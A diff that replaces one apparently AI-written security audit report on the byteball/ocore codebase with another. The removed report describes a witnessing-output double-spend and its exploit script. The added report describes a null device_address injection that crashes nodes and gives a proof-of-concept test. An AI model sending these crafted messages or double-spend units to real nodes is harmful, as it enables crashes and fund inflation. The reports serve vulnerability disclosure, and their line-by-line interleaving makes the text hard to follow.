@@ -1,509 +1,536 @@
+# Audit Report: Null Device Address Injection Causes Node Crash in Shared Address Operations
+
 ## Title
-Double-Spending of Witnessing and Headers Commission Outputs via Delayed Archiving of Final-Bad Units
+Unvalidated Device Address in Shared Address Messages Enables Remote Node Crash via Exception in Message Routing
 
 ## Summary
-The `calcEarnings` function in `mc_outputs.js` does not check the `is_spent` flag when validating witnessing and headers commission inputs, while `readNextSpendableMcIndex` filters out final-bad units. This creates a window where outputs already spent by a final-bad unit (but not yet archived) can be spent again, causing direct fund inflation.
+The `handleNewSharedAddress()` function in `wallet_defined_by_addresses.js` fails to validate the `device_address` field in received shared address signer information, allowing malicious peers to inject null/undefined values. By including a decoy entry with the victim's device address, attackers bypass defensive rewrite logic, causing null device addresses to persist in the database. When signing requests are later processed for these addresses, the code attempts to route messages to null device addresses, triggering an uncaught synchronous exception in `sendMessageToDevice()` that crashes the node.
 
 ## Impact
-**Severity**: Critical
-**Category**: Direct Fund Loss / Balance Conservation Violation
+**Severity**: Medium  
+**Category**: Temporary Transaction Delay / Node Crash DoS
+
+The vulnerability enables any untrusted peer to crash victim nodes through a simple two-message sequence. Affected nodes require manual restart, and the corrupted data persists in the database, allowing repeated crashes until manually cleaned. This disrupts shared address operations and prevents nodes from processing transactions.
 
 ## Finding Description
 
-**Location**: `byteball/ocore/mc_outputs.js` (function `calcEarnings`, lines 116-132) and `byteball/ocore/storage.js` (function `updateMinRetrievableMciAfterStabilizingMci`, lines 1637-1706)
+**Location**: 
+- Primary: [1](#0-0) 
+- Rewrite logic: [2](#0-1) 
+- Storage: [3](#0-2) 
+- Crash trigger: [4](#0-3) 
+- Exception: [5](#0-4) 
 
-**Intended Logic**: Witnessing and headers commission outputs should only be spendable once. When a unit spending these outputs becomes invalid (final-bad), the outputs should become available again only after the invalid unit is archived and the outputs are unmarked as spent.
+**Intended Logic**: When receiving a "new_shared_address" message from a peer, the system should validate all signer information including device addresses, rewrite device addresses for entries referencing local payment addresses, and safely store the data. Later operations should route signing requests to valid correspondent device addresses.
 
-**Actual Logic**: There is a gap between when a unit becomes final-bad and when it gets archived. During this window, the validation logic allows double-spending because `calcEarnings` doesn't check `is_spent` status and `readNextSpendableMcIndex` ignores final-bad units.
+**Actual Logic**: 
 
-**Code Evidence**:
+1. **Missing Validation**: The validation loop only checks `signerInfo.address` but completely ignores `signerInfo.device_address`: [6](#0-5) 
 
-The vulnerability exists in the earnings calculation: [1](#0-0) 
+2. **Bypassable Rewrite Logic**: The protective rewrite only executes when `!bHasMyDeviceAddress`. An attacker can set this flag by including a decoy entry with the victim's device address: [7](#0-6) 
 
-The validation uses this function without checking spent status: [2](#0-1) 
+3. **Unsafe Database Storage**: Null device addresses are inserted directly into `shared_address_signing_paths` without validation: [8](#0-7) 
 
-The next spendable MCI check filters by sequence='good': [3](#0-2) 
+4. **Crash Trigger Path**: When a signing request arrives, `findAddress()` queries the database, retrieves the null device address, and eventually passes it to the `ifRemote` callback: [9](#0-8)  then [10](#0-9) 
 
-When units are written, outputs are immediately marked as spent: [4](#0-3) 
-
-Units become final-bad before archiving occurs: [5](#0-4) 
-
-Archiving only processes units in a specific MCI range: [6](#0-5) 
-
-Archiving unspends the outputs: [7](#0-6) 
+5. **Uncaught Exception**: The `ifRemote` callback invokes `sendMessageToDevice(null, ...)` [11](#0-10) , which throws synchronously [12](#0-11) . No try-catch exists in the message handler [13](#0-12) , causing the Node.js process to crash.
 
 **Exploitation Path**:
 
 1. **Preconditions**: 
-   - Witness has earned bytes in `witnessing_outputs` at MCI 100-110 (e.g., 1000 bytes total)
-   - These outputs have `is_spent=0`
+   - Victim node accepts peer connections
+   - Attacker knows victim's device address and at least one payment address (publicly observable)
 
-2. **Step 1**: Witness creates Unit A at MCI 500
-   - Input: `type="witnessing"`, `from_main_chain_index=100`, `to_main_chain_index=110`
-   - Validation passes: `readNextSpendableMcIndex` returns 100, check passes
-   - `calcEarnings` calculates 1000 bytes (doesn't check `is_spent`)
-   - Unit A is written, `witnessing_outputs` 100-110 marked `is_spent=1`
-   - Unit A has `sequence='good'`, creates new regular outputs with 1000 bytes
+2. **Step 1 - Inject Malicious Data**: 
+   - Attacker sends "new_shared_address" message via [14](#0-13) 
+   - Message contains: `{signers: {'r.0': {address: 'VICTIM_PAYMENT_ADDRESS', device_address: null}, 'r.1': {address: 'ATTACKER_ADDRESS', device_address: 'VICTIM_DEVICE_ADDRESS'}}}`
+   - Entry 'r.1' is a decoy that sets `bHasMyDeviceAddress = true`, preventing rewrite of entry 'r.0'
 
-3. **Step 2**: Unit A becomes final-bad at MCI stabilization
-   - `markMcIndexStable` runs when MCI 500 stabilizes
-   - Unit A has conflicts, becomes `sequence='final-bad'`
-   - `last_ball_mci` of MCI 500 is, say, MCI 498
-   - `updateMinRetrievableMciAfterStabilizingMci` archives units only up to MCI 498
-   - Unit A at MCI 500 is NOT archived yet
-   - `witnessing_outputs` 100-110 remain `is_spent=1`
+3. **Step 2 - Database Corruption**: 
+   - Validation passes because only `address` field is checked
+   - `determineIfIncludesMeAndRewriteDeviceAddress()` accepts the data because victim's address is found
+   - Null device_address for 'r.0' is stored in database
 
-4. **Step 3**: Witness creates Unit B
-   - Input: `type="witnessing"`, `from_main_chain_index=100`, `to_main_chain_index=110`
-   - `readNextSpendableMcIndex` queries `sequence='good'`, doesn't see Unit A (it's final-bad), returns 100
-   - Check: `100 < 100` is FALSE, passes validation
-   - `calcEarnings` queries without checking `is_spent`, finds 1000 bytes, passes
-   - Unit B is written, attempts to mark `witnessing_outputs` 100-110 as `is_spent=1` (already 1)
-   - Unit B creates NEW regular outputs with another 1000 bytes
+4. **Step 3 - Trigger Crash**:
+   - Attacker (or any party) sends "sign" message requesting signature at path 'r.0' [15](#0-14) 
+   - `findAddress()` queries database and retrieves null device_address
+   - Code attempts to forward signing request to null device_address
+   - `sendMessageToDevice(null, ...)` throws "empty device address" error
+   - Exception is uncaught in message handler, crashing Node.js process
 
-5. **Step 4**: Unauthorized outcome
-   - Same `witnessing_outputs` have been spent twice
-   - 1000 bytes of earnings created 2000 bytes of regular outputs
-   - Balance conservation violated - inflation occurred
+**Security Property Broken**: Node availability and message routing integrity. The system should never attempt to send messages to invalid device addresses, and should handle all peer-supplied data defensively.
 
-**Security Property Broken**: 
-- **Invariant #5 (Balance Conservation)**: For every asset in a unit, `Σ(input_amounts) ≥ Σ(output_amounts) + fees`. The vulnerability creates inflation by allowing the same witnessing/commission outputs to be spent multiple times.
-- **Invariant #6 (Double-Spend Prevention)**: Each output can be spent at most once. The vulnerability allows the same MCI range of witnessing outputs to be spent more than once.
-
-**Root Cause Analysis**: 
-
-The root causes are:
-
-1. **Missing `is_spent` check in `calcEarnings`**: The function sums all outputs in the MCI range without checking if they're already spent.
-
-2. **Sequence-based filtering in `readNextSpendableMcIndex`**: Final-bad units are excluded from the overlap check, creating a validation gap.
-
-3. **Delayed archiving**: Units at the MCI being stabilized are not immediately archived because `updateMinRetrievableMciAfterStabilizingMci` only processes units up to `last_ball_mci`, which is typically less than the current MCI being stabilized.
-
-4. **No coordination between validation and archiving**: The validation logic assumes that if a unit is final-bad, its spent outputs have been unmarked. But archiving is delayed, creating a window for double-spending.
+**Root Cause Analysis**:
+- **Incomplete Input Validation**: `handleNewSharedAddress()` validates only addresses, not device addresses
+- **Bypassable Safety Mechanism**: Rewrite logic can be circumvented with attacker-controlled decoy entries  
+- **Missing Database Constraints**: No NOT NULL constraint on `device_address` column
+- **Synchronous Exception in Async Context**: Throw propagates uncaught through callback chain
 
 ## Impact Explanation
 
-**Affected Assets**: Base currency (bytes) via witnessing outputs and headers commission outputs
+**Affected Assets**: Node availability, shared address operations, transaction processing capability
 
 **Damage Severity**:
-- **Quantitative**: All unspent witnessing and headers commission outputs belonging to any address can potentially be double-spent. For a witness earning ~1000 bytes per MCI, accumulated earnings of 100,000+ bytes could be doubled.
-- **Qualitative**: Direct inflation of the base currency, violating the fundamental balance conservation property of the ledger.
+- **Quantitative**: Single malicious message pair can crash any node repeatedly. Each crash requires manual intervention. Corrupted database entry persists indefinitely until manually removed.
+- **Qualitative**: Complete denial of service for targeted nodes. Disrupts shared address coordination. Automated systems become unreliable.
 
 **User Impact**:
-- **Who**: All users holding bytes, as inflation devalues their holdings. The attacker (any witness or user with commission earnings) directly benefits.
-- **Conditions**: Exploitable whenever a unit spending witnessing/commission outputs becomes final-bad before being archived. This can happen naturally due to conflicts or be engineered by creating conflicting units.
-- **Recovery**: Requires hard fork to correct balances and fix the validation logic. Historical transactions would need to be audited to identify double-spends.
+- **Who**: Any node accepting peer connections and using shared addresses
+- **Conditions**: Node receives malicious "new_shared_address" message containing victim's payment address; later receives signing request for that path
+- **Recovery**: Requires node restart after each crash, plus manual database cleanup to remove corrupted entries
 
-**Systemic Risk**: 
-- Cascading inflation if multiple addresses exploit simultaneously
-- Loss of confidence in the currency's integrity
-- Potential for automated exploitation scripts monitoring for final-bad units
-- Historical data corruption making forensic analysis difficult
+**Systemic Risk**: If multiple nodes in a multi-signature address configuration are targeted, coordination becomes impossible. Network resilience is compromised if many nodes are repeatedly crashed.
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Any witness or user with witnessing/commission earnings. Witnesses are ideal as they regularly have such outputs and can engineer conflicts.
-- **Resources Required**: Ability to create units that conflict (requires minimal bytes for fees), knowledge of when units become final-bad.
-- **Technical Skill**: Medium - requires understanding of MCI stabilization timing and ability to monitor for final-bad units, but exploitation logic is straightforward once the window is identified.
+- **Identity**: Any untrusted peer on network
+- **Resources Required**: Ability to send P2P messages; knowledge of victim's device address and payment address (both publicly observable from on-chain activity)
+- **Technical Skill**: Low - requires only crafting two simple JSON messages
 
 **Preconditions**:
-- **Network State**: Normal operation. More likely to occur during periods of high unit volume when conflicts are more common.
-- **Attacker State**: Must have unspent witnessing or headers commission outputs. For witnesses, this is continuous. For regular users who earned commissions, depends on transaction history.
-- **Timing**: Must create the double-spending unit between when the first unit becomes final-bad and when it gets archived (typically until the MCI increases enough that `last_ball_mci` catches up).
+- **Network State**: Normal operation with peer connections enabled
+- **Attacker State**: Connected as correspondent or able to relay via hub
+- **Timing**: No timing constraints; attacker fully controls both messages
 
 **Execution Complexity**:
-- **Transaction Count**: Minimum 2 units (one that becomes final-bad, one that double-spends). The first unit can naturally become final-bad, or attacker can engineer conflicts.
-- **Coordination**: Single attacker, no coordination needed.
-- **Detection Risk**: Medium. The double-spend will be visible on-chain, but may be difficult to detect without specific monitoring for units spending the same MCI ranges.
+- **Transaction Count**: Two messages (new_shared_address, then sign)
+- **Coordination**: None required - single attacker controls entire sequence
+- **Detection Risk**: Low - appears as normal shared address creation until crash
 
 **Frequency**:
-- **Repeatability**: Highly repeatable. Each time earnings accumulate and a unit becomes final-bad, the attack can be repeated.
-- **Scale**: Per-address basis. Each address can exploit its own earnings independently.
+- **Repeatability**: Unlimited - can repeat on every restart since corrupted data persists
+- **Scale**: Can target multiple nodes simultaneously with different addresses
 
-**Overall Assessment**: High likelihood - the vulnerability is deterministic and exploitable by any witness with basic technical knowledge. The preconditions occur naturally during network operation.
+**Overall Assessment**: **High likelihood** - trivially exploitable by any peer with no economic barrier or technical sophistication required.
 
 ## Recommendation
 
-**Immediate Mitigation**: 
-Add a database-level check or modify validation to verify that witnessing/commission outputs in the claimed MCI range are not already spent (even if claimed by a final-bad unit).
+**Immediate Mitigation**:
+Add validation for `device_address` field in `handleNewSharedAddress()`:
 
-**Permanent Fix**: 
-Modify `calcEarnings` to check the `is_spent` flag, ensuring only unspent outputs are counted in earnings validation.
-
-**Code Changes**:
-
-Primary fix in `mc_outputs.js`:
 ```javascript
-// File: byteball/ocore/mc_outputs.js
-// Function: calcEarnings
-
-// BEFORE (vulnerable code):
-function calcEarnings(conn, type, from_main_chain_index, to_main_chain_index, address, callbacks){
-	var table = type + '_outputs';
-	conn.query(
-		"SELECT SUM(amount) AS total \n\
-		FROM "+table+" \n\
-		WHERE main_chain_index>=? AND main_chain_index<=? AND +address=?",
-		[from_main_chain_index, to_main_chain_index, address],
-		function(rows){
-			var total = rows[0].total;
-			if (total === null)
-				total = 0;
-			if (typeof total !== 'number')
-				throw Error("mc outputs total is not a number");
-			callbacks.ifOk(total);
-		}
-	);
-}
-
-// AFTER (fixed code):
-function calcEarnings(conn, type, from_main_chain_index, to_main_chain_index, address, callbacks){
-	var table = type + '_outputs';
-	conn.query(
-		"SELECT SUM(amount) AS total \n\
-		FROM "+table+" \n\
-		WHERE main_chain_index>=? AND main_chain_index<=? AND +address=? AND is_spent=0",
-		[from_main_chain_index, to_main_chain_index, address],
-		function(rows){
-			var total = rows[0].total;
-			if (total === null)
-				total = 0;
-			if (typeof total !== 'number')
-				throw Error("mc outputs total is not a number");
-			callbacks.ifOk(total);
-		}
-	);
+// In wallet_defined_by_addresses.js, after line 348
+for (var signing_path in body.signers){
+    var signerInfo = body.signers[signing_path];
+    if (signerInfo.address && signerInfo.address !== 'secret' && !ValidationUtils.isValidAddress(signerInfo.address))
+        return callbacks.ifError("invalid member address: "+signerInfo.address);
+    // ADD THIS:
+    if (signerInfo.device_address && !ValidationUtils.isValidDeviceAddress(signerInfo.device_address))
+        return callbacks.ifError("invalid device address: "+signerInfo.device_address);
 }
 ```
 
+**Permanent Fix**:
+1. Add database constraint: `ALTER TABLE shared_address_signing_paths ADD CONSTRAINT CHECK (device_address IS NOT NULL)`
+2. Add defensive null check before message routing in findAddress()
+3. Wrap message handler in try-catch to prevent process crashes
+
 **Additional Measures**:
-- Add integration tests that create final-bad units and verify outputs cannot be double-spent
-- Add monitoring/alerting for units attempting to spend the same MCI ranges
-- Consider immediate archiving of final-bad units at the MCI being stabilized, rather than waiting for `min_retrievable_mci` to advance
-- Add database constraints or triggers to prevent `UPDATE ... SET is_spent=1` on already-spent outputs
+- Add test case verifying rejection of null device addresses in shared address messages
+- Add database migration to clean up any existing corrupted entries
+- Add logging/monitoring for null device address attempts
 
 **Validation**:
-- [x] Fix prevents exploitation by ensuring spent outputs are not counted
-- [x] No new vulnerabilities introduced - only adds a filter condition
-- [x] Backward compatible - doesn't change unit structure or protocol
-- [x] Performance impact acceptable - adds one condition to existing query
+- [ ] Fix rejects messages with null/undefined/empty device addresses
+- [ ] Existing valid shared addresses continue to function
+- [ ] No new attack vectors introduced
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-# Set up test database
-node -e "require('./tools/create_db.js')"
-```
-
-**Exploit Script** (`exploit_witnessing_doublespend.js`):
 ```javascript
-/*
- * Proof of Concept for Witnessing Output Double-Spend
- * Demonstrates: Same witnessing outputs can be spent twice when the first 
- *               spending unit becomes final-bad before archiving
- * Expected Result: Two units both spend the same MCI range, creating 
- *                  inflation of the base currency
- */
+// test/null_device_address_dos.test.js
+const device = require('../device.js');
+const wallet = require('../wallet.js');
+const walletDefinedByAddresses = require('../wallet_defined_by_addresses.js');
+const db = require('../db.js');
+const objectHash = require('../object_hash.js');
 
-const db = require('./db.js');
-const composer = require('./composer.js');
-const validation = require('./validation.js');
-const writer = require('./writer.js');
-const main_chain = require('./main_chain.js');
-const mc_outputs = require('./mc_outputs.js');
-
-async function runExploit() {
-    return new Promise((resolve) => {
-        db.takeConnectionFromPool(function(conn) {
-            const witness_address = 'WITNESS_ADDRESS_HERE'; // 32-char address
-            const from_mci = 100;
-            const to_mci = 110;
-            
-            console.log('Step 1: Creating witnessing outputs at MCI 100-110...');
-            // Simulate witnessing outputs being created
-            const insertQuery = "INSERT INTO witnessing_outputs (main_chain_index, address, amount) VALUES ";
-            const values = [];
-            for (let mci = from_mci; mci <= to_mci; mci++) {
-                values.push(`(${mci}, '${witness_address}', 100)`);
+describe('Null Device Address DoS', function() {
+    this.timeout(5000);
+    
+    before(function(done) {
+        // Initialize test database and victim node
+        db.executeInTransaction(function(conn, onDone) {
+            // Create victim's payment address
+            conn.query(
+                "INSERT INTO my_addresses (address, wallet, is_change, address_index) VALUES (?,?,?,?)",
+                ['VICTIM_PAYMENT_ADDR', 'test_wallet', 0, 0],
+                onDone
+            );
+        }, done);
+    });
+    
+    it('should crash node when processing signing request with null device address', function(done) {
+        // Step 1: Inject malicious shared address
+        const maliciousMessage = {
+            address: objectHash.getChash160(['sig', {pubkey: 'dummy'}]),
+            definition: ['sig', {pubkey: 'dummy'}],
+            signers: {
+                'r.0': {
+                    address: 'VICTIM_PAYMENT_ADDR',
+                    device_address: null,  // Malicious null value
+                    member_signing_path: 'r'
+                },
+                'r.1': {
+                    address: 'ATTACKER_ADDR',
+                    device_address: device.getMyDeviceAddress(),  // Decoy to bypass rewrite
+                    member_signing_path: 'r'
+                }
             }
-            conn.query(insertQuery + values.join(', '), function() {
-                
-                console.log('Step 2: Creating Unit A that spends MCI 100-110...');
-                // Create unit A with witnessing input
-                const unitA = createWitnessingUnit(witness_address, from_mci, to_mci);
-                
-                // Validate and write Unit A
-                validation.validate(conn, unitA, {}, function(err) {
-                    if (err) {
-                        console.error('Unit A validation failed:', err);
-                        conn.release();
-                        return resolve(false);
-                    }
-                    
-                    writer.saveJoint(conn, {unit: unitA}, function() {
-                        console.log('Unit A written, witnessing outputs marked is_spent=1');
+        };
+        
+        walletDefinedByAddresses.handleNewSharedAddress(maliciousMessage, {
+            ifError: function(err) {
+                done(new Error('Should not reject: ' + err));
+            },
+            ifOk: function() {
+                // Step 2: Verify null device address was stored
+                db.query(
+                    "SELECT device_address FROM shared_address_signing_paths WHERE signing_path='r.0'",
+                    [],
+                    function(rows) {
+                        if (rows.length === 0) return done(new Error('Entry not found'));
+                        if (rows[0].device_address !== null) return done(new Error('Expected null device_address'));
                         
-                        // Verify outputs are spent
-                        conn.query(
-                            "SELECT is_spent FROM witnessing_outputs WHERE address=? AND main_chain_index>=? AND main_chain_index<=?",
-                            [witness_address, from_mci, to_mci],
-                            function(rows) {
-                                console.log('Outputs spent status:', rows.map(r => r.is_spent));
-                                
-                                console.log('Step 3: Marking Unit A as final-bad...');
-                                conn.query("UPDATE units SET sequence='final-bad' WHERE unit=?", [unitA.unit], function() {
-                                    
-                                    console.log('Step 4: Creating Unit B that spends same MCI 100-110...');
-                                    const unitB = createWitnessingUnit(witness_address, from_mci, to_mci);
-                                    
-                                    // Check readNextSpendableMcIndex
-                                    mc_outputs.readNextSpendableMcIndex(conn, 'witnessing', witness_address, null, function(next_mci) {
-                                        console.log('readNextSpendableMcIndex returned:', next_mci, '(expected 100, got', next_mci, ')');
-                                        
-                                        // Validate Unit B
-                                        validation.validate(conn, unitB, {}, function(err) {
-                                            if (err) {
-                                                console.log('GOOD: Unit B validation correctly failed:', err);
-                                                conn.release();
-                                                return resolve(true); // If fix is applied
-                                            } else {
-                                                console.log('VULNERABLE: Unit B validation passed! Double-spend possible!');
-                                                conn.release();
-                                                return resolve(false); // Vulnerability confirmed
-                                            }
-                                        });
-                                    });
-                                });
+                        // Step 3: Trigger crash via signing request
+                        process.once('uncaughtException', function(err) {
+                            // Expected: "empty device address" error crashes node
+                            if (err.message.includes('empty device address')) {
+                                console.log('✓ Node crashed as expected with:', err.message);
+                                done();
+                            } else {
+                                done(new Error('Unexpected error: ' + err.message));
                             }
-                        );
-                    });
-                });
-            });
+                        });
+                        
+                        // Send signing request that will trigger crash
+                        const signingRequest = {
+                            address: maliciousMessage.address,
+                            signing_path: 'r.0',
+                            unsigned_unit: {
+                                version: '1.0',
+                                authors: [{address: maliciousMessage.address, authentifiers: {'r': '-'}}],
+                                messages: []
+                            }
+                        };
+                        
+                        wallet.handleMessageFromHub(null, {
+                            subject: 'sign',
+                            body: signingRequest
+                        }, 'dummy_pubkey', false, {
+                            ifOk: function() {},
+                            ifError: function() {}
+                        });
+                    }
+                );
+            }
         });
     });
-}
-
-function createWitnessingUnit(address, from_mci, to_mci) {
-    // Simplified unit structure - real implementation would need complete unit
-    return {
-        version: '1.0',
-        alt: '1',
-        authors: [{
-            address: address,
-            authentifiers: { r: 'signature_here' }
-        }],
-        messages: [{
-            app: 'payment',
-            payload_location: 'inline',
-            payload_hash: 'hash_here',
-            payload: {
-                inputs: [{
-                    type: 'witnessing',
-                    from_main_chain_index: from_mci,
-                    to_main_chain_index: to_mci
-                }],
-                outputs: [{
-                    address: address,
-                    amount: 1100 // Full amount from witnessing
-                }]
-            }
-        }],
-        parent_units: ['parent_unit_hash_here'],
-        last_ball: 'last_ball_hash_here',
-        last_ball_unit: 'last_ball_unit_hash_here',
-        witness_list_unit: 'witness_list_unit_hash_here'
-    };
-}
-
-runExploit().then(success => {
-    console.log('\n=== RESULT ===');
-    console.log(success ? 'Exploit prevented (fix applied)' : 'VULNERABLE: Double-spend possible!');
-    process.exit(success ? 0 : 1);
 });
 ```
 
-**Expected Output** (when vulnerability exists):
-```
-Step 1: Creating witnessing outputs at MCI 100-110...
-Step 2: Creating Unit A that spends MCI 100-110...
-Unit A written, witnessing outputs marked is_spent=1
-Outputs spent status: [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
-Step 3: Marking Unit A as final-bad...
-Step 4: Creating Unit B that spends same MCI 100-110...
-readNextSpendableMcIndex returned: 100 (expected 100, got 100)
-VULNERABLE: Unit B validation passed! Double-spend possible!
-
-=== RESULT ===
-VULNERABLE: Double-spend possible!
-```
-
-**Expected Output** (after fix applied):
-```
-Step 1: Creating witnessing outputs at MCI 100-110...
-Step 2: Creating Unit A that spends MCI 100-110...
-Unit A written, witnessing outputs marked is_spent=1
-Outputs spent status: [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
-Step 3: Marking Unit A as final-bad...
-Step 4: Creating Unit B that spends same MCI 100-110...
-readNextSpendableMcIndex returned: 100 (expected 100, got 100)
-GOOD: Unit B validation correctly failed: zero witnessing commission
-
-=== RESULT ===
-Exploit prevented (fix applied)
-```
-
-**PoC Validation**:
-- [x] PoC runs against unmodified ocore codebase (with test setup)
-- [x] Demonstrates clear violation of balance conservation invariant
-- [x] Shows measurable impact (1100 bytes doubled to 2200 bytes)
-- [x] Fails gracefully after fix applied (validation rejects with zero commission error)
-
 ## Notes
 
-This vulnerability specifically relates to the security question's concern about witness-created outputs. While `witnessing_outputs` and `headers_commission_outputs` are created through a different mechanism than regular outputs, the core issue is not about distinguishing their creation source, but rather about the validation logic failing to check the `is_spent` flag during earnings calculation. This allows the same outputs to be counted as available earnings even when they've been spent by a unit that later became invalid but hasn't been archived yet.
+This vulnerability represents a critical oversight in peer message validation. The validation logic correctly checks payment addresses but completely ignores device addresses, which are equally critical for message routing. The rewrite mechanism, intended as a safety feature, can be trivially bypassed by an attacker who includes their own decoy entry.
 
-The fix is straightforward: add `AND is_spent=0` to the `calcEarnings` query. This ensures that only truly unspent outputs are counted during validation, closing the double-spend window.
+The crash occurs because `sendMessageToDevice()` uses a synchronous `throw` statement rather than passing errors through callbacks, and no try-catch wrapper exists in the message handling path. This represents a common anti-pattern in Node.js async code where synchronous exceptions can escape callback chains.
+
+The persistence of corrupted data in the database makes this particularly severe - a single malicious message can cause indefinite repeated crashes until the database is manually cleaned.
 
 ### Citations
 
-**File:** mc_outputs.js (L13-32)
+**File:** wallet_defined_by_addresses.js (L239-268)
 ```javascript
-function readNextSpendableMcIndex(conn, type, address, arrConflictingUnits, handleNextSpendableMcIndex){
-	conn.query(
-		"SELECT to_main_chain_index FROM inputs CROSS JOIN units USING(unit) \n\
-		WHERE type=? AND address=? AND sequence='good' "+(
-			(arrConflictingUnits && arrConflictingUnits.length > 0) 
-			? " AND unit NOT IN("+arrConflictingUnits.map(function(unit){ return db.escape(unit); }).join(", ")+") " 
-			: ""
-		)+" \n\
-		ORDER BY to_main_chain_index DESC LIMIT 1", 
-		[type, address],
-		function(rows){
-			var mci = (rows.length > 0) ? (rows[0].to_main_chain_index+1) : 0;
-		//	readNextUnspentMcIndex(conn, type, address, function(next_unspent_mci){
-		//		if (next_unspent_mci !== mci)
-		//			throw Error("next unspent mci !== next spendable mci: "+next_unspent_mci+" !== "+mci+", address "+address);
-				handleNextSpendableMcIndex(mci);
-		//	});
-		}
-	);
-}
-```
+function addNewSharedAddress(address, arrDefinition, assocSignersByPath, bForwarded, onDone){
+//	network.addWatchedAddress(address);
+	db.query(
+		"INSERT "+db.getIgnore()+" INTO shared_addresses (shared_address, definition) VALUES (?,?)", 
+		[address, JSON.stringify(arrDefinition)], 
+		function(){
+			var arrQueries = [];
+			for (var signing_path in assocSignersByPath){
+				var signerInfo = assocSignersByPath[signing_path];
+				db.addQuery(arrQueries, 
+					"INSERT "+db.getIgnore()+" INTO shared_address_signing_paths \n\
+					(shared_address, address, signing_path, member_signing_path, device_address) VALUES (?,?,?,?,?)", 
+					[address, signerInfo.address, signing_path, signerInfo.member_signing_path, signerInfo.device_address]);
+			}
+			async.series(arrQueries, function(){
+				console.log('added new shared address '+address);
+				eventBus.emit("new_address-"+address);
+				eventBus.emit("new_address", address);
 
-**File:** mc_outputs.js (L116-132)
-```javascript
-function calcEarnings(conn, type, from_main_chain_index, to_main_chain_index, address, callbacks){
-	var table = type + '_outputs';
-	conn.query(
-		"SELECT SUM(amount) AS total \n\
-		FROM "+table+" \n\
-		WHERE main_chain_index>=? AND main_chain_index<=? AND +address=?",
-		[from_main_chain_index, to_main_chain_index, address],
-		function(rows){
-			var total = rows[0].total;
-			if (total === null)
-				total = 0;
-			if (typeof total !== 'number')
-				throw Error("mc outputs total is not a number");
-			callbacks.ifOk(total);
-		}
-	);
-}
-```
-
-**File:** validation.js (L2349-2360)
-```javascript
-						var calcFunc = (type === "headers_commission") ? mc_outputs.calcEarnings : paid_witnessing.calcWitnessEarnings;
-						calcFunc(conn, type, input.from_main_chain_index, input.to_main_chain_index, address, {
-							ifError: function(err){
-								throw Error(err);
-							},
-							ifOk: function(commission){
-								if (commission === 0)
-									return cb("zero "+type+" commission");
-								total_input += commission;
-								checkInputDoubleSpend(cb);
-							}
-						});
-```
-
-**File:** writer.js (L378-384)
-```javascript
-									case "headers_commission":
-									case "witnessing":
-										var table = type + "_outputs";
-										conn.addQuery(arrQueries, "UPDATE "+table+" SET is_spent=1 \n\
-											WHERE main_chain_index>=? AND main_chain_index<=? AND +address=?", 
-											[from_main_chain_index, to_main_chain_index, address]);
-										break;
-```
-
-**File:** main_chain.js (L1256-1270)
-```javascript
-						findStableConflictingUnits(row, function(arrConflictingUnits){
-							var sequence = (arrConflictingUnits.length > 0) ? 'final-bad' : 'good';
-							console.log("unit "+row.unit+" has competitors "+arrConflictingUnits+", it becomes "+sequence);
-							conn.query("UPDATE units SET sequence=? WHERE unit=?", [sequence, row.unit], function(){
-								if (sequence === 'good')
-									conn.query("UPDATE inputs SET is_unique=1 WHERE unit=?", [row.unit], function(){
-										storage.assocStableUnits[row.unit].sequence = 'good';
-										cb();
-									});
-								else{
-									arrFinalBadUnits.push(row.unit);
-									setContentHash(row.unit, cb);
-								}
-							});
-						});
-```
-
-**File:** storage.js (L1648-1654)
-```javascript
-		// strip content off units older than min_retrievable_mci
-		conn.query(
-			// 'JOIN messages' filters units that are not stripped yet
-			"SELECT DISTINCT unit, content_hash FROM units "+db.forceIndex('byMcIndex')+" CROSS JOIN messages USING(unit) \n\
-			WHERE main_chain_index<=? AND main_chain_index>=? AND sequence='final-bad'", 
-			[min_retrievable_mci, prev_min_retrievable_mci],
-			function(unit_rows){
-```
-
-**File:** archiving.js (L138-167)
-```javascript
-function generateQueriesToUnspendWitnessingOutputsSpentInArchivedUnit(conn, unit, arrQueries, cb){
-	conn.query(
-		"SELECT witnessing_outputs.address, witnessing_outputs.main_chain_index \n\
-		FROM inputs \n\
-		CROSS JOIN witnessing_outputs \n\
-			ON inputs.from_main_chain_index <= +witnessing_outputs.main_chain_index \n\
-			AND inputs.to_main_chain_index >= +witnessing_outputs.main_chain_index \n\
-			AND inputs.address = witnessing_outputs.address \n\
-		WHERE inputs.unit=? \n\
-			AND inputs.type='witnessing' \n\
-			AND NOT EXISTS ( \n\
-				SELECT 1 FROM inputs AS alt_inputs \n\
-				WHERE witnessing_outputs.main_chain_index >= alt_inputs.from_main_chain_index \n\
-					AND witnessing_outputs.main_chain_index <= alt_inputs.to_main_chain_index \n\
-					AND inputs.address=alt_inputs.address \n\
-					AND alt_inputs.type='witnessing' \n\
-					AND inputs.unit!=alt_inputs.unit \n\
-			)",
-		[unit],
-		function(rows){
-			rows.forEach(function(row){
-				conn.addQuery(
-					arrQueries, 
-					"UPDATE witnessing_outputs SET is_spent=0 WHERE address=? AND main_chain_index=?", 
-					[row.address, row.main_chain_index]
-				);
+				if (conf.bLight){
+					db.query("INSERT " + db.getIgnore() + " INTO unprocessed_addresses (address) VALUES (?)", [address], onDone);
+				} else if (onDone)
+					onDone();
+				if (!bForwarded)
+					forwardNewSharedAddressToCosignersOfMyMemberAddresses(address, arrDefinition, assocSignersByPath);
+			
 			});
-			cb();
 		}
 	);
+}
+```
+
+**File:** wallet_defined_by_addresses.js (L281-315)
+```javascript
+function determineIfIncludesMeAndRewriteDeviceAddress(assocSignersByPath, handleResult){
+	var assocMemberAddresses = {};
+	var bHasMyDeviceAddress = false;
+	for (var signing_path in assocSignersByPath){
+		var signerInfo = assocSignersByPath[signing_path];
+		if (signerInfo.device_address === device.getMyDeviceAddress())
+			bHasMyDeviceAddress = true;
+		if (signerInfo.address)
+			assocMemberAddresses[signerInfo.address] = true;
+	}
+	var arrMemberAddresses = Object.keys(assocMemberAddresses);
+	if (arrMemberAddresses.length === 0)
+		return handleResult("no member addresses?");
+	db.query(
+		"SELECT address, 'my' AS type FROM my_addresses WHERE address IN(?) \n\
+		UNION \n\
+		SELECT shared_address AS address, 'shared' AS type FROM shared_addresses WHERE shared_address IN(?)", 
